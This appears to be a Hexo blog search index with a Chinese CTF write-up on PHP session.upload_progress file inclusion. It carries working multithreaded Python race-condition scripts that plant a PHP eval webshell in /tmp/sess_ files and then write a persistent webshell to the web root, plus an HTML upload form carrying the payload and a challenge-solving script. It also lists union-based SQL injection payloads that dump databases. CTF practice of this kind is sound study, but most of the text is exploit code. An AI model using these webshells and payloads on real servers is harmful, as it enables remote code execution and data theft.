<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>6.23ctf+session临时文件包含</title>
    <url>/2023/06/23/6.23/</url>
    <content><![CDATA[<p>主要是看<a href="https://blog.csdn.net/qq_38154820/article/details/120300273">(37条消息) 详解利用session进行文件包含_session文件包含的原理及利用条件_合天网安实验室的博客-CSDN博客</a></p>
<h3 id="session-工作原理"><a href="#session-工作原理" class="headerlink" title="session 工作原理"></a>session 工作原理</h3><p>（1）首先使用session_start()函数进行初始换。</p>
<p>（2）当执行PHP脚本时，通过使用SESSION超全局变量注册session变量。</p>
<p>（3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.savepath指定，下次浏览网页时可以加载使用。</p>
<h3 id="什么是session-upload-progress？"><a href="#什么是session-upload-progress？" class="headerlink" title="什么是session.upload_progress？"></a>什么是session.upload_progress？</h3><p>与<code>open_basedir</code>、<code>allow_url_fopen</code>、<code>allow_url_include</code>等PHP配置一样，<code>session.upload_progress</code>也是PHP的一个功能，同样可以在<code>php.ini</code>中设置相关属性。其中最重要的几个设置如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled = on</span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>session.upload_progress.enabled可以控制是否开启session.upload_progress功能</li>
<li>session.upload_progress.cleanup可以控制是否在上传之后删除文件内容</li>
<li>session.upload_progress.prefix可以设置上传文件内容的前缀</li>
<li>session.upload_progress.name的值即为session中的键值</li>
</ul>
<p>另外，再添加个session配置中一个重要选项。</p>
<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要</p>
<h3 id="session-upload-progress开启之后会有什么效果？"><a href="#session-upload-progress开启之后会有什么效果？" class="headerlink" title="session.upload_progress开启之后会有什么效果？"></a><strong>session.upload_progress开启之后会有什么效果？</strong></h3><p>当我们将<code>session.upload_progress.enabled</code>的值设置为<strong>on</strong>时，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传进度等)存储在session当中。</p>
<p><strong>问题1：</strong></p>
<p>那么这个时候就会有一个前提条件，就是如何初始化session并且把session中的内容写到文件中去呢？</p>
<p><strong>分析1：</strong></p>
<p>我们可以注意到，php.ini中<code>session.use_strict_mode</code>选项默认是0，在这个情况下，用户可以自己定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去，具体文件的内容是什么，后面会写到。</p>
<p><strong>问题2：</strong></p>
<p>当session.upload_progress.cleanup的值为on时，即使上传文件，但是上传完成之后文件内容会被清空，这怎么办？</p>
<p><strong>分析2：</strong></p>
<p>进行<strong>条件竞争</strong></p>
<h3 id="如何利用session-upload-progress进行RCE？"><a href="#如何利用session-upload-progress进行RCE？" class="headerlink" title="如何利用session.upload_progress进行RCE？"></a>如何利用session.upload_progress进行RCE？</h3><p>首先，在网站根目录下随便新建一个<strong>test.php</strong>文件</p>
<p>然后写一个Python程序用于往服务器上上传文件：</p>
<p>这里有几个注意点：</p>
<ul>
<li><p>上传的文件大小为50KB，文件名为Lxxx.jpg</p>
</li>
<li><p>该程序设置的sessionid为Lxxx，也就是说会在&#x2F;tmp目录下生成sess_Lxxx文件</p>
</li>
<li><p>该程序设置的PHP_SESSION_UPLOAD_PROGRESS值为一句话木马，也就是说，在理论上，一句话木马会被写入到&#x2F;tmp&#x2F;sess_Lxxx中</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.128/test.php&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;Lxxx&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">   filebytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">   <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       res = session.post(url,</span><br><span class="line">           data=&#123;</span><br><span class="line">               <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">           cookies=&#123;</span><br><span class="line">               <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">              &#125;,</span><br><span class="line">           files=&#123;</span><br><span class="line">               <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Lxxx.jpg&#x27;</span>, filebytes)</span><br><span class="line">              &#125;</span><br><span class="line">          )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">       write(session)</span><br></pre></td></tr></table></figure>

<p>执行程序后，我们需要用<code>tail -f</code>命令实时查看<code>/tmp/sess_Lxxx</code>文件，因为在本地测试速度比较快，如果使用cat命令，文件内容还没输出就被删除了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f /tmp/sess_Lxxx</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/6e5255b29bc9f553040de37c62b70b03.png" alt="img"></p>
<p>也就是说，<code>/tmp/sess_Lxxx</code>文件中的内容为：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">upload_progress_</span>&lt;?php eval($_POST[<span class="number">1</span>]);?&gt;|a:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;start_time&quot;</span>;i:<span class="number">1631343214</span>;s:<span class="number">14</span>:<span class="string">&quot;content_length&quot;</span>;i:<span class="number">276</span>;s:<span class="number">15</span>:<span class="string">&quot;bytes_processed&quot;</span>;i:<span class="number">276</span>;s:<span class="number">4</span>:<span class="string">&quot;done&quot;</span>;b:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;files&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;field_name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;Lxxx.jpg&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;tmp_name&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;error&quot;</span>;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;done&quot;</span>;b:<span class="number">0</span>;s:<span class="number">10</span>:<span class="string">&quot;start_time&quot;</span>;i:<span class="number">1631343214</span>;s:<span class="number">15</span>:<span class="string">&quot;bytes_processed&quot;</span>;i:<span class="number">276</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>仔细分析一下该文件内容，该文件分为两块，以竖线<code>|</code>区分。</p>
<p><strong>第一块内容如下：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload_progress_<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一块内容由以下两个值组成：<code>session.upload_progress.name</code>+<code>PHP_SESSION_UPLOAD_PROGRESS</code></p>
<p><strong>第二块内容如下：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;start_time&quot;</span>;<span class="selector-tag">i</span>:<span class="number">1631343214</span>;s:<span class="number">14</span>:<span class="string">&quot;content_length&quot;</span>;<span class="selector-tag">i</span>:<span class="number">276</span>;s:<span class="number">15</span>:<span class="string">&quot;bytes_processed&quot;</span>;<span class="selector-tag">i</span>:<span class="number">276</span>;s:<span class="number">4</span>:<span class="string">&quot;done&quot;</span>;<span class="selector-tag">b</span>:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;files&quot;</span>;<span class="selector-tag">a</span>:<span class="number">1</span>:&#123;<span class="selector-tag">i</span>:<span class="number">0</span>;<span class="selector-tag">a</span>:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;field_name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;Lxxx.jpg&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;tmp_name&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;error&quot;</span>;<span class="selector-tag">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;done&quot;</span>;<span class="selector-tag">b</span>:<span class="number">0</span>;s:<span class="number">10</span>:<span class="string">&quot;start_time&quot;</span>;<span class="selector-tag">i</span>:<span class="number">1631343214</span>;s:<span class="number">15</span>:<span class="string">&quot;bytes_processed&quot;</span>;<span class="selector-tag">i</span>:<span class="number">276</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>一看就是序列化之后的值，我们将其进行反序列化后输出：</p>
<figure class="highlight sml"><table><tr><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">[<span class="string">&quot;start_time&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">int</span>(<span class="number">1631343214</span>)</span><br><span class="line">[<span class="string">&quot;content_length&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">int</span>(<span class="number">276</span>)</span><br><span class="line">[<span class="string">&quot;bytes_processed&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">int</span>(<span class="number">276</span>)</span><br><span class="line">[<span class="string">&quot;done&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">bool</span>(<span class="literal">false</span>)</span><br><span class="line">[<span class="string">&quot;files&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">   <span class="built_in">array</span>(<span class="number">7</span>) &#123;</span><br><span class="line">    [<span class="string">&quot;field_name&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;file&quot;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">string</span>(<span class="number">8</span>) <span class="string">&quot;Lxxx.jpg&quot;</span></span><br><span class="line">    [<span class="string">&quot;tmp_name&quot;</span>]=&gt;</span><br><span class="line">     <span class="type">NULL</span></span><br><span class="line">    [<span class="string">&quot;error&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">int</span>(<span class="number">0</span>)</span><br><span class="line">    [<span class="string">&quot;done&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">bool</span>(<span class="literal">false</span>)</span><br><span class="line">    [<span class="string">&quot;start_time&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">int</span>(<span class="number">1631343214</span>)</span><br><span class="line">    [<span class="string">&quot;bytes_processed&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">int</span>(<span class="number">276</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里记录了文件上传时间、文件大小、文件名称等等文件属性。</p>
<p>接下来在网站根目录新建一个<strong>test.php</strong>文件，文件内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>很明显有一个文件包含的漏洞。</p>
<p>接下来我们利用<code>session.upload_progress</code>进行<strong>条件竞争</strong></p>
<p>以下代码有几个注意点：</p>
<ul>
<li><p>整个代码的思路就是，往&#x2F;tmp&#x2F;sess_Lxxx文件中写入一句话木马，密码为1，然后用题目中的文件包含漏洞，包含这一个文件，在函数read中尝试利用&#x2F;tmp&#x2F;sess_Lxxx的一句话往网站根目录文件1.php写一句话木马，密码为2</p>
</li>
<li><p>利用Python的多线程，一边上传文件，一边尝试往根目录中写入1.php，如果成功写入了，就打印输出“成功写入一句话”</p>
<p>这里利用Python的threading模块，开5个线程进行条件竞争</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.2.128/test.php&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;Lxxx&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_ invoke__">write</span>(session):</span><br><span class="line">   filebytes = io.<span class="title function_ invoke__">BytesIO</span>(b<span class="string">&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">   <span class="keyword">while</span> True:</span><br><span class="line">       res = session.<span class="title function_ invoke__">post</span>(url,</span><br><span class="line">           data=&#123;</span><br><span class="line">               <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">           cookies=&#123;</span><br><span class="line">               <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">              &#125;,</span><br><span class="line">           files=&#123;</span><br><span class="line">               <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Lxxx.jpg&#x27;</span>, filebytes)</span><br><span class="line">              &#125;</span><br><span class="line">          )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_ invoke__">read</span>(session):</span><br><span class="line">   <span class="keyword">while</span> True:</span><br><span class="line">       res = session.<span class="title function_ invoke__">post</span>(url+<span class="string">&quot;?a=/tmp/sess_&quot;</span>+sessid,</span><br><span class="line">                          data=&#123;</span><br><span class="line">                              <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/www/admin/localhost_80/wwwroot/1.php&#x27; , &#x27;&lt;?php eval(<span class="subst">$_POST</span>[2]);?&gt;&#x27;);&quot;</span></span><br><span class="line">                          &#125;,</span><br><span class="line">                          cookies=&#123;</span><br><span class="line">                              <span class="string">&quot;PHPSESSID&quot;</span>:sessid</span><br><span class="line">                          &#125;</span><br><span class="line">                          )</span><br><span class="line">       res2 = session.<span class="title function_ invoke__">get</span>(<span class="string">&quot;http://192.168.2.128/1.php&quot;</span>)</span><br><span class="line">       <span class="keyword">if</span> res2.status_code == <span class="number">200</span>:</span><br><span class="line">           <span class="keyword">print</span>(<span class="string">&quot;成功写入一句话！&quot;</span>)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">print</span>(<span class="string">&quot;Retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   evnet = threading.<span class="title function_ invoke__">Event</span>()</span><br><span class="line">   with requests.<span class="title function_ invoke__">session</span>() <span class="keyword">as</span> session:</span><br><span class="line">       <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">5</span>):</span><br><span class="line">           threading.<span class="title function_ invoke__">Thread</span>(target=write, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line">       <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">5</span>):</span><br><span class="line">           threading.<span class="title function_ invoke__">Thread</span>(target=read, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line">   evnet.<span class="title function_ invoke__">set</span>()</span><br></pre></td></tr></table></figure>

<p>另外一种就用burp抓包了，手动访问了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>hakaiisu<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://challenge-41a945986720d0e4.sandbox.ctfhub.com:10800/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><span class="comment">&lt;!-- 	</span></span><br><span class="line"><span class="comment">不对字符编码--&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;go&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意要添加cookie</p>
<h1 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目给出了源码,分析这道题能干嘛,能利用的函数有eval()和include()</p>
<p>更进eval 怎么利用的要传参数shell,但是这里(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)，长度限制了,并且过滤了一下字符,数字加字母最多就8个字符，明显走不通,但是能利用这里phpinfo();</p>
<p>更进include 因为有个include函数,可以利用临时文件,日志文件来包含,但是日志文件长度不够,想着临时文件包含,看php版本发现是5.5&gt;5.4,且<strong>session.upload_progress.enabled</strong>开了的,所以利用脚本获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># 多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cffi.backend_ctypes <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://node4.anna.nssctf.cn:28176/&#x27;</span></span><br><span class="line">file = <span class="string">&#x27;ph0ebus.txt&#x27;</span>  <span class="comment"># 上传文件名</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)  <span class="comment"># 文件内容，插入大量垃圾字符来使返回的时间更久，这样临时文件保存的时间更长</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(target, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]retry&quot;</span>)</span><br><span class="line">            <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):  <span class="comment"># 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好</span></span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">            <span class="comment"># target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="LitCTF-2023-这是什么？SQL-！注一下"><a href="#LitCTF-2023-这是什么？SQL-！注一下" class="headerlink" title="[LitCTF 2023]这是什么？SQL ！注一下"></a>[LitCTF 2023]这是什么？SQL ！注一下</h1><p>这道题,发现用打比赛写文件方法不行,发现过滤了&lt;?,估计是比赛的非预期解吧<br>题目给出了查询语句,所以可以直接sql注入</p>
<p>尝试了1))))) or 1&#x3D;1#把这个表数据爆完了发现了彩蛋的flag</p>
<p>没有正经的flag了,那估计再其他数据库里面了,通过联合注入，查询所有数据库，再查表查数据就行了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> schema_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.schemata#</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> <span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> flag,<span class="number">2</span> <span class="keyword">from</span> ctftraining.flag</span><br></pre></td></tr></table></figure>

<h1 id="陇剑杯-2021-jwt"><a href="#陇剑杯-2021-jwt" class="headerlink" title="[陇剑杯 2021]jwt"></a>[陇剑杯 2021]jwt</h1><p>都是简单的流量分析,你一看就会</p>
]]></content>
      <categories>
        <category>ctf记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjsonのfirst</title>
    <url>/2023/11/26/Fastjson/</url>
